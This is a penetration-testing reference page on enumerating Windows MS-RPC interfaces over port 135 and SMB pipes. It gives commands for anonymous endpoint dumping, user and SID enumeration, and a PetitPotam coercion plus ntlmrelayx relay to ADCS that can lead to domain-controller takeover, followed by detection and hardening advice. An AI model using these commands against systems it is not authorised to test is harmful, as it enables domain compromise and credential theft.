---
title: MS-RPC Endpoint Mapper Enumeration
slug: msrpc-enum
---

> **TL;DR:** TCP 135 is the Windows endpoint mapper; querying it returns every RPC interface bound on the host, and named pipes like `\PIPE\lsarpc` are the launchpad for coercion attacks such as PetitPotam.

## What it is
MS-RPC is the universal IPC fabric of Windows. Services register interfaces (identified by UUIDs) with the endpoint mapper on port 135, which clients query to learn the dynamic high port or named pipe to actually talk to. Many post-exploitation techniques on Windows are RPC interfaces: SAMR for user enumeration, LSARPC for SID translation, MS-EFSR for file-share coercion, MS-RPRN for the print spooler, MS-DRSR for replication abuse.

## Preconditions / where it applies
- TCP/135 endpoint mapper, plus dynamic ports 49152-65535 (Windows Vista+) or 1024-5000 (legacy)
- SMB pipes on TCP/445 carry the same interfaces under different names
- No authentication required to query the mapper; many interfaces accept anonymous or NULL-session binds
- Standard on every domain controller, member server, and workstation

## Technique
```bash
# Endpoint dump
rpcdump.py 'DOMAIN/anonymous:@10.0.0.50'
impacket-rpcdump 10.0.0.50
nmap -p 135 --script msrpc-enum 10.0.0.50

# Named-pipe enumeration over SMB
nxc smb 10.0.0.50 -u '' -p '' --pipes
impacket-rpcmap 'ncacn_np:10.0.0.50[\PIPE\lsarpc]'

# SAMR user list (anonymous if RestrictAnonymous=0)
impacket-samrdump 10.0.0.50

# LSARPC SID->name lookups
impacket-lookupsid 'DOMAIN/anonymous:@10.0.0.50' 20000

# MS-EFSR coercion (PetitPotam) — force the DC to NTLM-auth to us
PetitPotam.py -u '' -p '' attacker.lab 10.0.0.50
# Capture with ntlmrelayx → ADCS ESC8 or LDAP relay to a takeover
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs --template DomainController
```

## Detection and defence
- Audit Event ID 5712 (RPC call attempted) and 4624 logon type 3 from unexpected sources
- Patch MS-EFSR: KB5005413 + EFS endpoints filtering, MS-RPRN: disable spooler on DCs
- Block 135 at the perimeter; on internal networks use RPC filters (`netsh rpc filter`) to restrict EFSRPC, DCOM, and SPOOLSS to trusted SIDs
- Enforce SMB signing and LDAP channel binding to neutralise relayed NTLM
- EDR: alert on `\PIPE\efsrpc`, `\PIPE\lsarpc` binds from non-domain accounts

## References
- [MS-RPCE protocol spec](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/) — authoritative
- [Impacket examples](https://github.com/fortra/impacket) — rpcdump, samrdump, lookupsid sources

See also: [[smb-enum]], [[petitpotam-coercion]], [[exposed-services]].
